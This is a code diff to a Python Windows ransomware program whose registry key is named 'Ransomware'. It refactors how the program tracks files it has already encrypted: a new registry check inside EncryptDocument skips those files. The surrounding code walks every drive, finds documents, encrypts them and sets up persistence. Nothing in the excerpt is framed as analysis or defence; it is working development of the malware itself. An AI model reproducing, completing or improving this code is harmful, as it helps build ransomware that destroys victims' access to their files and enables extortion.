@@ -49,15 +49,18 @@ def EncryptDocument(document_path):
 	
 	try:
 		key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
-	
-		value, regtype = QueryValueEx(key, os.path.basename(document_path))
-	
-		CloseKey(key)
-		if value is not None:
-			return
 	except:
-		pass
-			
+		key = CreateKey(HKEY_CURRENT_USER, keyVal)
+		
+	try:
+		value, regtype = QueryValueEx(key, os.path.basename(document_path))		
+		return
+		
+	except:
+		SetValueEx(key, os.path.basename(document_path), 0, REG_SZ, os.path.abspath(document_path))
+
+	CloseKey(key)
+	
 	try:
 		chunk_size = 64 * 1024
 		IV = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
@@ -167,21 +170,6 @@ def ObtainPersistence():
 	CloseKey(key)
 		
 
-def RecordEncryptedDocs(docs):
-
-	keyVal = r'SOFTWARE\Ransomware\Files'
-	
-	try:
-		key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
-	except:
-		key = CreateKey(HKEY_CURRENT_USER, keyVal)
-		
-	for doc in docs:
-		SetValueEx(key, os.path.basename(doc), 0, REG_SZ, os.path.abspath(doc))
-	
-	CloseKey(key)
-
-	
 def GetDriveLetters():
 
 	api_call = win32api.GetLogicalDriveStrings()
@@ -203,7 +191,6 @@ if __name__ == '__main__':
 	
 	for drive in drives:
 		docs = FindDocuments(drive)
-		RecordEncryptedDocs(docs)
 		for doc in docs:
 			EncryptDocument(doc)
 			
